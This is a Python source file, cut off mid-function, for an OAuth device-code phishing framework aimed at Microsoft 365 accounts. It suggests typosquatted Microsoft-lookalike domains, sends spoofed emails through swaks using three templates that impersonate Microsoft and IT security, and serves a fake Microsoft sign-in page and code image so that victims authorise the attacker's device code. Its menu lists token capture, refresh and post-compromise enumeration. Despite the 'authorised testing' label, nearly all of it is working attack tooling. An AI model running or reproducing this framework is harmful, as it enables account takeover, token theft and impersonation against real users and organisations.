#!/usr/bin/env python3
"""
DeviceCode Phisher — OAuth Device Code Phishing Framework
For authorised security testing only.
"""

import argparse
import json
import io
import os
import ssl
import subprocess
import sys
import threading
import time
import re
import shutil
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

try:
    from PIL import Image, ImageDraw, ImageFont
except ImportError:
    print("\n  [!] Pillow not installed. Run: pip install pillow --break-system-packages\n")
    sys.exit(1)

try:
    import requests as req_lib
except ImportError:
    print("\n  [!] requests not installed. Run: pip install requests --break-system-packages\n")
    sys.exit(1)


# ════════════════════════════════════════════════════════════════
#  BRANDING & COLORS
# ════════════════════════════════════════════════════════════════
VERSION = "2.0.0"

class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
    M = "\033[95m"; CY = "\033[96m"; W = "\033[97m"; BOLD = "\033[1m"
    DIM = "\033[2m"; X = "\033[0m"; BG_G = "\033[42m"; BG_R = "\033[41m"
    IT = "\033[3m"; UL = "\033[4m"

if not sys.stdout.isatty():
    for a in ["R","G","Y","B","M","CY","W","BOLD","DIM","X","BG_G","BG_R","IT","UL"]:
        setattr(C, a, "")

BANNER = f"""{C.CY}
    ██████╗ ███████╗██╗   ██╗██╗ ██████╗███████╗ ██████╗ ██████╗ ██████╗ ███████╗
    ██╔══██╗██╔════╝██║   ██║██║██╔════╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝
    ██║  ██║█████╗  ██║   ██║██║██║     █████╗  ██║     ██║   ██║██║  ██║█████╗
    ██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║     ██╔══╝  ██║     ██║   ██║██║  ██║██╔══╝
    ██████╔╝███████╗ ╚████╔╝ ██║╚██████╗███████╗╚██████╗╚██████╔╝██████╔╝███████╗
    ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝ ╚═════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝

    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗
    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
    ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{C.X}

    {C.DIM}┌──────────────────────────────────────────────────────────────┐{C.X}
    {C.DIM}│{C.X}  {C.W}OAuth Device Code Phishing Framework{C.X}         {C.CY}v{VERSION}{C.X}        {C.DIM}│{C.X}
    {C.DIM}│{C.X}  {C.DIM}by{C.X} {C.BOLD}0dayscyber{C.X}                    {C.DIM}github.com/theemperorspath{C.X} {C.DIM}│{C.X}
    {C.DIM}│{C.X}  {C.Y}For authorised security testing only{C.X}                        {C.DIM}│{C.X}
    {C.DIM}└──────────────────────────────────────────────────────────────┘{C.X}
"""

MINI_BANNER = f"""
    {C.CY}┌──────────────────────────────────────────┐{C.X}
    {C.CY}│{C.X}  {C.BOLD}DeviceCode Phisher{C.X} v{VERSION}               {C.CY}│{C.X}
    {C.CY}│{C.X}  {C.DIM}by 0dayscyber{C.X}                           {C.CY}│{C.X}
    {C.CY}└──────────────────────────────────────────┘{C.X}
"""

MENU = f"""
    {C.BOLD}{C.W}What would you like to do?{C.X}

    {C.CY}[1]{C.X}  {C.W}Setup{C.X}           {C.DIM}— Configure domain, TLS certs & dependencies{C.X}
    {C.CY}[2]{C.X}  {C.W}Attack{C.X}          {C.DIM}— Launch device code phishing attack{C.X}
    {C.CY}[3]{C.X}  {C.W}Enumerate{C.X}       {C.DIM}— Post-compromise enumeration on captured token{C.X}
    {C.CY}[4]{C.X}  {C.W}Refresh Token{C.X}   {C.DIM}— Get new access token from refresh token{C.X}
    {C.CY}[5]{C.X}  {C.W}Templates{C.X}       {C.DIM}— View available email templates{C.X}
    {C.CY}[6]{C.X}  {C.W}Client IDs{C.X}      {C.DIM}— View available OAuth client IDs{C.X}

    {C.R}[0]{C.X}  {C.DIM}Exit{C.X}
"""

CLIENT_IDS = {
    "Microsoft Office":  "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "Azure CLI":         "04b07795-a71b-4346-935f-02f9a1efa4ce",
    "MS Teams":          "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "Outlook Mobile":    "27922004-5251-4030-b22d-91ecd9a37084",
    "Office 365":        "0ec893e0-5785-4de6-99da-4ed124e5296c",
    "OneDrive":          "ab9b8c07-8f02-4f72-87fa-80105867a763",
}

DEFAULT_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"


# ════════════════════════════════════════════════════════════════
#  UI HELPERS
# ════════════════════════════════════════════════════════════════
def cls():
    os.system("clear" if os.name != "nt" else "cls")

def section(title):
    print()
    print(f"    {C.B}{'━' * 62}{C.X}")
    print(f"    {C.BOLD}{C.B}  {title}{C.X}")
    print(f"    {C.B}{'━' * 62}{C.X}")
    print()

def prompt(text, default=None, required=True, password=False):
    suffix = f" {C.DIM}[{default}]{C.X}" if default else ""
    while True:
        try:
            val = input(f"    {C.CY}›{C.X} {text}{suffix}: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)
        if not val and default:
            return default
        if val or not required:
            return val
        print(f"    {C.R}  This field is required{C.X}")

def confirm(text, default=True):
    d = "Y/n" if default else "y/N"
    try:
        val = input(f"    {C.CY}›{C.X} {text} [{d}]: ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)
    if not val:
        return default
    return val in ("y", "yes")

def choose(text, options, default=None):
    print(f"\n    {C.W}{text}{C.X}\n")
    for i, (label, desc) in enumerate(options, 1):
        d = f" {C.G}← default{C.X}" if default and default == label else ""
        print(f"    {C.CY}[{i}]{C.X}  {C.W}{label:20s}{C.X} {C.DIM}{desc}{C.X}{d}")
    print()
    while True:
        try:
            val = input(f"    {C.CY}›{C.X} Choice: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)
        if not val and default:
            for i, (label, _) in enumerate(options):
                if label == default:
                    return label
        try:
            idx = int(val) - 1
            if 0 <= idx < len(options):
                return options[idx][0]
        except ValueError:
            pass
        print(f"    {C.R}  Invalid choice{C.X}")

def success(msg):
    print(f"    {C.G}[+]{C.X} {msg}")

def info(msg):
    print(f"    {C.B}[*]{C.X} {msg}")

def warning(msg):
    print(f"    {C.Y}[!]{C.X} {msg}")

def error(msg):
    print(f"    {C.R}[-]{C.X} {msg}")

def critical(msg):
    print(f"    {C.BOLD}{C.R}[‼]{C.X} {C.BOLD}{msg}{C.X}")

def status_line(attempt, max_attempts, code, elapsed, views):
    mins, secs = int(elapsed // 60), int(elapsed % 60)
    bw = 30
    p = min(elapsed / 870, 1.0)
    bar = f"{'█' * int(bw * p)}{'░' * (bw - int(bw * p))}"
    sys.stdout.write(
        f"\r    {C.DIM}│{C.X} "
        f"{C.Y}Code:{C.X} {C.BOLD}{code}{C.X}  "
        f"{C.DIM}│{C.X} {C.B}{bar}{C.X} {mins:02d}:{secs:02d}  "
        f"{C.DIM}│{C.X} {C.M}Views: {views}{C.X}  "
        f"{C.DIM}│ [{attempt}/{max_attempts}]{C.X}"
    )
    sys.stdout.flush()

def clear_line():
    sys.stdout.write("\r" + " " * 120 + "\r")


# ════════════════════════════════════════════════════════════════
#  LOGGING
# ════════════════════════════════════════════════════════════════
class Logger:
    def __init__(self, log_file=None):
        self.log_file = log_file

    def _log(self, prefix, color, msg):
        clear_line()
        print(f"    {C.DIM}│{C.X} {color}{prefix}{C.X} {msg}")
        if self.log_file:
            ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
            with open(self.log_file, "a") as f:
                f.write(f"[{ts}] {prefix} {msg}\n")

    def info(self, msg):     self._log("[*]", C.B, msg)
    def success(self, msg):  self._log("[+]", C.G, msg)
    def warning(self, msg):  self._log("[!]", C.Y, msg)
    def error(self, msg):    self._log("[-]", C.R, msg)
    def critical(self, msg): self._log("[‼]", C.R + C.BOLD, f"{C.BOLD}{msg}{C.X}")

log = Logger()


# ════════════════════════════════════════════════════════════════
#  SETUP WIZARD
# ════════════════════════════════════════════════════════════════
def run_cmd(cmd, check=False):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return r

def wizard_setup():
    section("SETUP WIZARD")
    info("This wizard will configure your phishing infrastructure.")
    info("You need: a VPS, a phishing domain, and DNS access.\n")

    # Step 1: Check dependencies
    section("STEP 1 — DEPENDENCIES")
    deps = {
        "swaks": "sudo apt install swaks -y",
        "certbot": "sudo apt install certbot -y",
        "python3": None,
        "curl": None,
    }
    missing = []
    for dep, install_cmd in deps.items():
        if shutil.which(dep):
            success(f"{dep} installed")
        else:
            error(f"{dep} not found")
            if install_cmd:
                missing.append((dep, install_cmd))

    try:
        from PIL import Image
        success("pillow installed")
    except ImportError:
        error("pillow not found")
        missing.append(("pillow", "pip install pillow --break-system-packages"))

    try:
        import requests
        success("requests installed")
    except ImportError:
        error("requests not found")
        missing.append(("requests", "pip install requests --break-system-packages"))

    if missing:
        print()
        if confirm("Install missing dependencies now?"):
            for dep, cmd in missing:
                info(f"Installing {dep}...")
                r = run_cmd(cmd)
                if r.returncode == 0:
                    success(f"{dep} installed")
                else:
                    error(f"Failed to install {dep}: {r.stderr[:100]}")
        else:
            warning("Install these manually before running an attack:")
            for dep, cmd in missing:
                info(f"  {cmd}")
            return

    # Step 2: Domain configuration
    section("STEP 2 — DOMAIN CONFIGURATION")
    print(f"""    {C.W}You need a phishing domain that looks like a Microsoft domain.{C.X}
    {C.DIM}Good examples:{C.X}
    {C.CY}  microsofrtonline.com       {C.DIM}(typosquat — r/t swap){C.X}
    {C.CY}  microsoftonllne.com        {C.DIM}(typosquat — i/l swap){C.X}
    {C.CY}  login-microsoft.com        {C.DIM}(hyphenated){C.X}
    {C.CY}  microsoft-verify.com       {C.DIM}(action word){C.X}
    """)

    domain = prompt("Your phishing domain", required=True)
    subdomain = prompt("Subdomain for image server", default="verify")
    full_domain = f"{subdomain}.{domain}"
    vps_ip = prompt("VPS IP address", required=True)

    print()
    section("STEP 2a — DNS RECORDS")
    print(f"""    {C.W}Add these DNS records to {C.CY}{domain}{C.W}:{C.X}

    {C.BOLD}{'Type':<8} {'Name':<35} {'Value':<25} {'TTL'}{C.X}
    {C.DIM}{'─' * 80}{C.X}
    {C.W}A{C.X}        {C.CY}{subdomain:<35}{C.X} {C.G}{vps_ip:<25}{C.X} 300
    {C.DIM}{'─' * 80}{C.X}

    {C.DIM}If you already have a wildcard A record (*.{domain}){C.X}
    {C.DIM}pointing to {vps_ip}, no new record is needed.{C.X}
    """)

    if not confirm(f"Is {full_domain} pointing to {vps_ip}?"):
        warning("Configure DNS and come back when it's propagated.")
        info(f"Test with: dig +short {full_domain}")
        return

    # Verify DNS
    info(f"Verifying DNS for {full_domain}...")
    r = run_cmd(f"dig +short {full_domain}")
    resolved = r.stdout.strip()
    if vps_ip in resolved:
        success(f"{full_domain} → {resolved}")
    else:
        warning(f"DNS returned: {resolved or 'nothing'}")
        if not confirm("Continue anyway?"):
            return

    # Step 3: TLS Certificate
    section("STEP 3 — TLS CERTIFICATE")

    # Check for existing certs
    cert_paths = [
        f"/etc/letsencrypt/live/{full_domain}",
        f"/etc/letsencrypt/live/{domain}",
    ]
    existing_cert = None
    for cp in cert_paths:
        cert_file = os.path.join(cp, "fullchain.pem")
        key_file = os.path.join(cp, "privkey.pem")
        if os.path.exists(cert_file) and os.path.exists(key_file):
            # Check if expired
            r = run_cmd(f'openssl x509 -in "{cert_file}" -checkend 0 -noout')
            if r.returncode == 0:
                # Check if it covers our domain
                r2 = run_cmd(f'openssl x509 -in "{cert_file}" -text -noout 2>/dev/null | grep -i "DNS:"')
                dns_names = r2.stdout.strip()
                if full_domain in dns_names or f"*.{domain}" in dns_names:
                    success(f"Valid certificate found at {cp}")
                    success(f"  Covers: {dns_names.strip()}")
                    existing_cert = cp
                    break
                else:
                    warning(f"Cert at {cp} doesn't cover {full_domain}")
            else:
                warning(f"Certificate at {cp} is expired")

    if existing_cert:
        cert_dir = existing_cert
        if not confirm("Use this certificate?"):
            existing_cert = None

    if not existing_cert:
        info("Need to obtain a TLS certificate via Let's Encrypt.")
        print(f"""
    {C.DIM}This requires:{C.X}
    {C.DIM}  • Port 80 open and not in use by another service{C.X}
    {C.DIM}  • DNS already pointing to this server{C.X}
        """)

        if confirm("Obtain certificate now?"):
            # Check port 80
            r = run_cmd("ss -tlnp | grep ':80 '")
            if r.stdout.strip():
                warning("Port 80 is in use:")
                info(f"  {r.stdout.strip()}")
                if confirm("Attempt to stop the service and continue?"):
                    run_cmd("sudo systemctl stop nginx apache2 2>/dev/null")
                    run_cmd("sudo pkill -f 'listen.*:80'")
                    time.sleep(2)

            info(f"Requesting certificate for {full_domain}...")
            # Kill any stuck certbot
            run_cmd("sudo killall certbot 2>/dev/null")
            run_cmd("sudo rm -f /tmp/.certbot.lock /var/lib/letsencrypt/.certbot.lock")
            time.sleep(1)

            r = run_cmd(f"sudo certbot certonly --standalone -d {full_domain} --non-interactive --agree-tos --register-unsafely-without-email")
            if r.returncode == 0:
                success("Certificate obtained!")
                cert_dir = f"/etc/letsencrypt/live/{full_domain}"
            else:
                error(f"Certbot failed: {r.stderr[:200]}")
                warning("You can try manually: sudo certbot certonly --standalone -d " + full_domain)

                # Fallback: ask for manual paths
                cert_dir = None
                if confirm("Provide certificate paths manually?"):
                    cert_file_path = prompt("Path to fullchain.pem")
                    key_file_path = prompt("Path to privkey.pem")
                    cert_dir = "__manual__"
                else:
                    return
        else:
            cert_file_path = prompt("Path to fullchain.pem")
            key_file_path = prompt("Path to privkey.pem")
            cert_dir = "__manual__"

    if cert_dir == "__manual__":
        tls_cert = cert_file_path
        tls_key = key_file_path
    else:
        tls_cert = os.path.join(cert_dir, "fullchain.pem")
        tls_key = os.path.join(cert_dir, "privkey.pem")

    # Step 4: Generate config
    section("STEP 4 — CONFIGURATION")

    mx_server = prompt("Default MX server for targets", default="aspmx.l.google.com")
    port = prompt("Server port", default="443")

    config = {
        "target_email": "",
        "spoofed_sender": "",
        "mx_server": mx_server,
        "tenant": "organizations",
        "client_id": DEFAULT_CLIENT_ID,
        "server_port": int(port),
        "image_url": f"https://{full_domain}/code.png" if port == "443" else f"https://{full_domain}:{port}/code.png",
        "tls_cert": tls_cert,
        "tls_key": tls_key,
        "email_template": "default",
        "max_attempts": 10,
        "output_file": "token_output.json",
        "log_file": "phisher.log",
        "serve_landing_page": True,
        "phishing_domain": full_domain,
    }

    config_path = "config.json"
    with open(config_path, "w") as f:
        json.dump(config, f, indent=2)

    section("SETUP COMPLETE")
    success(f"Config saved to {C.BOLD}{config_path}{C.X}")
    print()
    print(f"    {C.G}┌{'─' * 58}┐{C.X}")
    print(f"    {C.G}│{C.X}  {C.BOLD}Infrastructure Ready{C.X}                                      {C.G}│{C.X}")
    print(f"    {C.G}├{'─' * 58}┤{C.X}")
    print(f"    {C.G}│{C.X}  Domain    : {C.CY}{full_domain:43s}{C.X}{C.G}│{C.X}")
    print(f"    {C.G}│{C.X}  VPS       : {C.W}{vps_ip:43s}{C.X}{C.G}│{C.X}")
    print(f"    {C.G}│{C.X}  TLS       : {C.G}{'Valid':43s}{C.X}{C.G}│{C.X}")
    print(f"    {C.G}│{C.X}  Port      : {C.W}{port:43s}{C.X}{C.G}│{C.X}")
    print(f"    {C.G}│{C.X}  Image URL : {C.CY}{config['image_url'][:43]:43s}{C.X}{C.G}│{C.X}")
    print(f"    {C.G}│{C.X}  Config    : {C.Y}{config_path:43s}{C.X}{C.G}│{C.X}")
    print(f"    {C.G}└{'─' * 58}┘{C.X}")
    print()
    info("Run the attack wizard next: select option [2] from the menu")


# ════════════════════════════════════════════════════════════════
#  ATTACK WIZARD
# ════════════════════════════════════════════════════════════════
def wizard_attack():
    section("ATTACK WIZARD")

    # Load or create config
    config_path = "config.json"
    if os.path.exists(config_path):
        with open(config_path) as f:
            config = json.load(f)
        success(f"Loaded config from {config_path}")
        if config.get("phishing_domain"):
            info(f"Infrastructure: {config['phishing_domain']}")
    else:
        warning("No config.json found. Run setup first (option 1) or provide details now.")
        config = {}

    # Target details
    section("TARGET")
    config["target_email"] = prompt("Target email address",
        default=config.get("target_email") or None)
    config["spoofed_sender"] = prompt("Spoofed sender email",
        default=config.get("spoofed_sender") or None)
    config["mx_server"] = prompt("Target MX server",
        default=config.get("mx_server", "aspmx.l.google.com"))

    # Tenant
    print()
    tenant_input = prompt("Target tenant ID", default=config.get("tenant", "organizations"))
    config["tenant"] = tenant_input

    # Template selection
    section("EMAIL TEMPLATE")
    templates = [
        ("default",         "Colleague asks to verify account"),
        ("it_security",     "IT security policy update — urgent"),
        ("session_expired", "Microsoft session expired notification"),
    ]
    config["email_template"] = choose("Select email template:", templates,
        default=config.get("email_template", "default"))

    # Client ID
    section("OAUTH CLIENT ID")
    client_options = [(name, cid) for name, cid in CLIENT_IDS.items()]
    selected = choose("Select OAuth client application:", client_options,
        default="Microsoft Office")
    config["client_id"] = CLIENT_IDS[selected]

    # Email delivery method
    section("EMAIL DELIVERY")
    print(f"""    {C.W}How should the phishing email be sent?{C.X}

    {C.CY}[1]{C.X}  {C.W}Auto{C.X}    {C.DIM}— Tool sends via swaks from this server{C.X}
    {C.CY}[2]{C.X}  {C.W}Manual{C.X}  {C.DIM}— You send from another machine (port 25 blocked){C.X}
    """)
    try:
        email_choice = input(f"    {C.CY}›{C.X} Choice [1]: ").strip() or "1"
    except (EOFError, KeyboardInterrupt):
        print()
        return

    auto_email = email_choice == "1"
    config["auto_send_email"] = auto_email

    # Max attempts
    config["max_attempts"] = int(prompt("Max code refresh attempts", default=str(config.get("max_attempts", 10))))
    config["output_file"] = prompt("Output file for captured tokens", default=config.get("output_file", "token_output.json"))

    # Ensure required fields
    for field in ["server_port", "image_url", "tls_cert", "tls_key"]:
        if field not in config or not config[field]:
            if field == "server_port":
                config[field] = int(prompt("Server port", default="443"))
            elif field == "image_url":
                domain = prompt("Image server domain (e.g. verify.yourdomain.com)")
                port = config.get("server_port", 443)
                config[field] = f"https://{domain}/code.png" if port == 443 else f"https://{domain}:{port}/code.png"
            elif field == "tls_cert":
                config[field] = prompt("Path to TLS fullchain.pem")
            elif field == "tls_key":
                config[field] = prompt("Path to TLS privkey.pem")

    config["log_file"] = "phisher.log"
    config["serve_landing_page"] = True
    config["scope"] = "https://graph.microsoft.com/.default offline_access"
    config["server_host"] = "0.0.0.0"
    config["image_width"] = 340
    config["image_height"] = 55
    config["image_bg_color"] = [255, 255, 255]
    config["image_text_color"] = [0, 0, 0]
    config["image_font_size"] = 30
    config["code_poll_interval"] = 5

    # Save config
    with open(config_path, "w") as f:
        json.dump(config, f, indent=2)

    # Confirm and launch
    section("ATTACK SUMMARY")
    rows = [
        ("Target", config["target_email"]),
        ("Spoofed Sender", config["spoofed_sender"]),
        ("MX Server", config["mx_server"]),
        ("Template", config["email_template"]),
        ("Client App", selected),
        ("Email Delivery", "Auto (swaks)" if auto_email else "Manual"),
        ("Max Attempts", str(config["max_attempts"])),
        ("Image URL", config["image_url"]),
        ("TLS", "Enabled" if config.get("tls_cert") else "HTTP only"),
    ]

    print(f"    {C.Y}┌{'─' * 58}┐{C.X}")
    for label, value in rows:
        vt = value[:43] if len(value) > 43 else value
        print(f"    {C.Y}│{C.X}  {C.W}{label:18s}{C.X} {C.DIM}→{C.X} {C.CY}{vt:36s}{C.X} {C.Y}│{C.X}")
    print(f"    {C.Y}└{'─' * 58}┘{C.X}")
    print()

    if not auto_email:
        img_url = config["image_url"]
        print(f"""    {C.Y}[!]{C.X} {C.W}Manual email mode{C.X} — send from a machine with port 25 access:

    {C.DIM}swaks --to {config['target_email']} \\{C.X}
    {C.DIM}      --from {config['spoofed_sender']} \\{C.X}
    {C.DIM}      --header "Subject: Microsoft Account Verification Required" \\{C.X}
    {C.DIM}      --header "Content-Type: text/html" \\{C.X}
    {C.DIM}      --header "MIME-Version: 1.0" \\{C.X}
    {C.DIM}      --body '<html><body style="font-family:Segoe UI,sans-serif;color:#333">{C.X}
    {C.DIM}        <p>Hi {config['target_email'].split('@')[0].capitalize()},</p>{C.X}
    {C.DIM}        <p>Please verify your Microsoft account at{C.X}
    {C.DIM}        <a href="https://microsoft.com/devicelogin">microsoft.com/devicelogin</a>{C.X}
    {C.DIM}        using the code below:</p>{C.X}
    {C.DIM}        <div style="text-align:center;margin:20px 0">{C.X}
    {C.DIM}        <img src="{img_url}" alt="Code"></div>{C.X}
    {C.DIM}        <p>Thanks</p></body></html>' \\{C.X}
    {C.DIM}      --server {config['mx_server']}{C.X}
    """)

    if not confirm(f"{C.BOLD}Launch attack?{C.X}"):
        info("Aborted.")
        return

    # Launch
    run_attack(config)


# ════════════════════════════════════════════════════════════════
#  EMAIL TEMPLATES
# ════════════════════════════════════════════════════════════════
EMAIL_TEMPLATES = {
    "default": {
        "subject": "Microsoft Account Verification Required",
        "body": """<html><head><style>
body{{font-family:'Segoe UI',Arial,sans-serif;color:#333;line-height:1.6;margin:0;padding:0}}
.c{{max-width:600px;margin:0 auto;padding:20px}}
.h{{border-bottom:2px solid #0078d4;padding-bottom:12px;margin-bottom:20px}}
.cb{{background:#f0f6ff;border:1px solid #c7e0f4;border-radius:4px;padding:20px;text-align:center;margin:20px 0}}
.f{{color:#999;font-size:12px;margin-top:30px;border-top:1px solid #eee;padding-top:12px}}
</style></head><body><div class="c">
<div class="h"><img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" width="108"></div>
<p>Hi {target_name},</p>
<p>{sender_name} has requested that all team members verify their Microsoft account as part of a routine security check.</p>
<p>Please go to <a href="https://microsoft.com/devicelogin">microsoft.com/devicelogin</a> and enter the following code:</p>
<div class="cb"><img src="{image_url}" alt="Your verification code" style="max-width:100%%;height:auto"></div>
<p>This should only take about 30 seconds.</p>
<p>Thanks,<br>{sender_name}</p>
<div class="f">This is an automated security notification.</div>
</div></body></html>""",
    },
    "it_security": {
        "subject": "Action Required: Security Policy Update",
        "body": """<html><head><style>
body{{font-family:'Segoe UI',Arial,sans-serif;color:#333;line-height:1.6;margin:0}}
.c{{max-width:600px;margin:0 auto;padding:20px}}
.a{{background:#fff4ce;border-left:4px solid #f0ad4e;padding:12px;margin:16px 0}}
.cb{{background:#f5f5f5;border:1px solid #ddd;border-radius:4px;padding:20px;text-align:center;margin:20px 0}}
</style></head><body><div class="c">
<h2 style="color:#0078d4;margin-top:0">Security Policy Update</h2>
<div class="a"><strong>Action required by end of day</strong></div>
<p>Hi {target_name},</p>
<p>As part of our updated security policies, all staff are required to re-verify their Microsoft account.</p>
<ol><li>Go to <a href="https://microsoft.com/devicelogin">microsoft.com/devicelogin</a></li>
<li>Enter the code below</li><li>Sign in with your credentials</li></ol>
<div class="cb"><img src="{image_url}" alt="Code" style="max-width:100%%;height:auto"></div>
<p>Questions? Reach out to {sender_name}.</p><p>Thanks,<br>IT Security</p>
</div></body></html>""",
    },
    "session_expired": {
        "subject": "Your Microsoft 365 session has expired",
        "body": """<html><head><style>
body{{font-family:'Segoe UI',Arial,sans-serif;color:#333;line-height:1.6;margin:0}}
.c{{max-width:600px;margin:0 auto;padding:20px}}
.cb{{background:#f0f6ff;border:1px solid #c7e0f4;border-radius:4px;padding:20px;text-align:center;margin:20px 0}}
</style></head><body><div class="c">
<img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" width="108">
<h2 style="margin-top:16px">Session Expired</h2>
<p>Hi {target_name},</p>
<p>Your Microsoft 365 session has expired. Visit <a href="https://microsoft.com/devicelogin">microsoft.com/devicelogin</a> and enter the code below:</p>
<div class="cb"><img src="{image_url}" alt="Code" style="max-width:100%%;height:auto"></div>
</div></body></html>""",
    },
}


def send_email(config):
    template_name = config.get("email_template", "default")
    if template_name in EMAIL_TEMPLATES:
        template = EMAIL_TEMPLATES[template_name]
        subject = config.get("email_subject") or template["subject"]
        body_tpl = template["body"]
    elif os.path.exists(template_name):
        with open(template_name) as f:
            body_tpl = f.read()
        subject = config.get("email_subject", "Microsoft Account Verification")
    else:
        log.error(f"Template not found: {template_name}")
        return False

    target_name = config["target_email"].split("@")[0].capitalize()
    sender_name = config["spoofed_sender"].split("@")[0].capitalize()
    body = body_tpl.format(target_name=target_name, sender_name=sender_name, image_url=config["image_url"])

    try:
        r = subprocess.run([
            "swaks", "--to", config["target_email"], "--from", config["spoofed_sender"],
            "--header", f"Subject: {subject}", "--header", "Content-Type: text/html",
            "--header", "MIME-Version: 1.0", "--body", body,
            "--server", config["mx_server"], "--silent", "1",
        ], capture_output=True, text=True, timeout=30)
        if r.returncode == 0:
            log.success(f"Email delivered to {C.BOLD}{config['target_email']}{C.X}")
            log.info(f"Spoofed from: {config['spoofed_sender']}")
            return True
        else:
            log.error(f"swaks failed: {r.stderr[:100]}")
            return False
    except subprocess.TimeoutExpired:
        log.error("swaks timed out — port 25 may be blocked. Use manual email mode.")
        return False
    except FileNotFoundError:
        log.error("swaks not found — run: sudo apt install swaks -y")
        return False


# ════════════════════════════════════════════════════════════════
#  IMAGE GENERATOR
# ════════════════════════════════════════════════════════════════
class ImageGenerator:
    def __init__(self, config):
        self.config = config
        self.font = self._load_font()

    def _load_font(self):
        for p in [
            "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf",
            "/usr/share/fonts/truetype/liberation/LiberationMono-Bold.ttf",
            "/System/Library/Fonts/Menlo.ttc",
        ]:
            if os.path.exists(p):
                try:
                    return ImageFont.truetype(p, self.config.get("image_font_size", 30))
                except:
                    continue
        return ImageFont.load_default()

    def generate(self, text):
        w = self.config.get("image_width", 340)
        h = self.config.get("image_height", 55)
        img = Image.new("RGB", (w, h), tuple(self.config.get("image_bg_color", [255,255,255])))
        draw = ImageDraw.Draw(img)
        bbox = draw.textbbox((0, 0), text, font=self.font)
        x = (w - (bbox[2] - bbox[0])) // 2
        y = (h - (bbox[3] - bbox[1])) // 2
        draw.text((x, y), text, fill=tuple(self.config.get("image_text_color", [0,0,0])), font=self.font)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        return buf.read()


# ════════════════════════════════════════════════════════════════
#  HTTPS SERVER
# ════════════════════════════════════════════════════════════════
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/code.png"):
            self._serve_image()
        elif self.path in ("/", "/verify") and self.server.cfg.get("serve_landing_page"):
            self._serve_landing()
        else:
            self.send_response(404)
            self.end_headers()

    def _serve_image(self):
        ip = self.client_address[0]
        ua = self.headers.get("User-Agent", "unknown")
        skip = ["GoogleImageProxy", "Mozilla/5.0 (Windows NT 5.1; rv:11.0)"]
        if not any(s in ua for s in skip):
            self.server.mgr.log_image_request(ip, ua)
        code = self.server.mgr.get_code()
        data = self.server.img.generate(code)
        self.send_response(200)
        for k, v in [("Content-Type","image/png"),("Content-Length",str(len(data))),
                      ("Cache-Control","no-cache,no-store,must-revalidate,max-age=0"),
                      ("Pragma","no-cache"),("Expires","0")]:
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(data)

    def _serve_landing(self):
        code = self.server.mgr.get_code()
        html = f'''<!DOCTYPE html><html><head><title>Sign in to your account</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{{font-family:'Segoe UI',sans-serif;background:#f2f2f2;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}}
.c{{max-width:440px;width:100%;background:#fff;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}}
h1{{font-size:24px;font-weight:600;margin:0 0 12px}}
p{{color:#666;font-size:15px;line-height:1.6}}
.code{{font-size:36px;font-weight:700;letter-spacing:4px;color:#0078d4;background:#f0f6ff;padding:20px;border-radius:4px;text-align:center;margin:24px 0;font-family:Consolas,monospace;border:1px solid #c7e0f4}}
.btn{{display:inline-block;background:#0078d4;color:#fff;padding:10px 20px;text-decoration:none;border-radius:2px;font-size:15px}}
.btn:hover{{background:#106ebe}} ol{{padding-left:20px}} li{{margin:8px 0;font-size:14px;color:#333}}
</style></head><body><div class="c">
<img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" width="108">
<h1>Enter code</h1><p>You\'ve been asked to verify your identity.</p>
<div class="code">{code}</div>
<ol><li>Go to <a href="https://microsoft.com/devicelogin">microsoft.com/devicelogin</a></li>
<li>Enter the code above</li><li>Sign in with your credentials</li></ol>
<a class="btn" href="https://microsoft.com/devicelogin" target="_blank">Open verification page</a>
<p style="color:#999;font-size:12px;margin-top:16px">Code refreshes automatically.</p>
</div><script>setTimeout(()=>location.reload(),60000)</script></body></html>'''
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Cache-Control", "no-cache,no-store")
        self.end_headers()
        self.wfile.write(html.encode())

    def log_message(self, *a):
        pass


class Server(HTTPServer):
    def __init__(self, cfg, mgr, img, *a, **kw):
        self.cfg = cfg; self.mgr = mgr; self.img = img
        super().__init__(*a, **kw)


def start_server(config, mgr, img):
    srv = Server(config, mgr, img, (config.get("server_host","0.0.0.0"), config["server_port"]), Handler)
    if config.get("tls_cert") and config.get("tls_key"):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(config["tls_cert"], config["tls_key"])
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
        proto = "HTTPS"
    else:
        proto = "HTTP"
